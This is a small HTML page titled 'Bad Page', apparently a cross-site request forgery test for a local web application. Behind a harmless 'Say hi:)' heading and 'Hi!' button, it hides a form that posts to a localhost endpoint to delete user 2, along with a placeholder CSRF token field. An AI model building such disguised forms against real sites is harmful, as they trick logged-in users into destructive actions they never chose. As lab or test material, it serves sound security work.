<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bad Page</title>
</head>
<body>
<h1>Say hi:)</h1>
<form method="post" action="http://localhost:8080/WebSite/users?action=delete&userId=2">
    <input type="submit" value="Hi!">
    <input type="hidden" value="&{csrf_token}" name="csrf_token">
</form>
</body>
</html>